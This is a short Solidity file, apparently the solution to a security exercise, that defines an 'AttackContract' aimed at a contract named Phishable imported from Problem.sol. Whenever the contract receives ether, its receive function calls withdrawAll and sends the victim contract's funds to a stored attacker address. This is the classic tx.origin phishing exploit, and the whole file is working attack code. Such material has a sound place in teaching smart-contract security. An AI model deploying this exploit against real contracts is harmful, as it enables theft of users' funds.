// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.5.0 <0.9.0;

import "./Problem.sol";
contract AttackContract { 
    
    Phishable phishableContract; 
    address payable attacker; // The attackers address to receive funds.
    constructor (Phishable _phishableContract, address payable _attackerAddress) { 
        phishableContract = _phishableContract; 
        attacker = _attackerAddress;
    }
    
    receive() external payable { 
        phishableContract.withdrawAll(attacker); 
    }
}